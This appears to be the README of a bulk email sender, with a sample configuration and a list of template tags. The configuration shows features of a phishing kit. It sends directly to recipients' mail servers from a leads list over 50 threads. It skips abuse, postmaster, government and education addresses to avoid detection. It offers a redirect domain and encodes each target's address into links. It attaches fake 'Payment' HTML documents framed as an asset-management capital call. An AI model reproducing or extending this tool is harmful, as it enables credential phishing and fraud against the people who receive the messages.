# Email Sender

A Python-based email sender with support for HTML templates, dynamic content, and various email tags.

## Installation

1. Make sure you have Python 3.6+ installed
2. Install the required dependencies:
```bash
pip install -r requirements.txt
## Usage
Run the sender command:
python send.py

## Configuration

1. Create a `setup.ini` file if not available with the SMTP settings below:

[TOKEN]
token = qBj4x2DjVmkGmlD

[SMTP]
loadsmtp : False
smtpserv :  {mx}
port : 25
username : 
password : 
fromemail : 
secure : False
authy : False
priority : HIGH


[SEND INFO]
name = Sender Name
fromemail = from@email.com
link = https://your-link.com
subject = Email Subject

[OPTION]
UsePause : True
PauseForSecs : 20
AfterSendEmail : 150
UseGoogle : 0
delay : 10
thread : 50
leads : leads.txt
mstype : html
useredirect : 0
403domain : http://linkfro.com
ignoreemail : True
igtype : Exclude
ignlist : abuse donotreply .ac.uk example rediffmail.com test webmaster postmaster .gov lcisd oxfarm altayer.com ifes school .in .edu example@ test webmaster demon mailer mailer-daemon @yahoo noreply no-reply postmaster customercare customer @hotmail. @live. 

[ATTACH OPTION]
usedoc : False
docname : Payment#{number200}.xhtml
doctit : 'REIG Asset Management' First Capital Call
doctype : HTML
autohtml : False
hide_html_code : False
creationdelay : 5
```

2. Create your email template in `message.html`

## Available Email Tags

### Basic Information
- `{email}` - Full email address
- `{domain}` - Email domain
- `{mename}` - Capitalized username
- `{mename3}` - First 3 letters of username (uppercase)
- `{frmsite}` - Domain name without TLD
- `{comapnyname}` - Company name

### Time and Date
- `{year}` - Current year
- `{time}` - Current time
- `{date}` - Current date
- `{dayoftheweek}` - Current day
- `{monthoftheyear}` - Current month

### Random Generation
- `{random}` - Random string
- `{number}` - Random number
- `{secs}` - Random string (8 chars)

### Encoding
- `{base64email}` - Base64 encoded email
- `{hexemail}` - Hex encoded email

### Special Patterns
- `urlencode(...)` - URL encoded content
- `base64{...}` - Base64 encoded content
- `linkbind{...}` - Link binding
- `{number(...)}` - Random number with length
- `{random(...)}` - Random string with length
- `{date(...)}` - Date with offset

### Images
- `{image}` - Company logo
- `{print}` - HTML screenshot
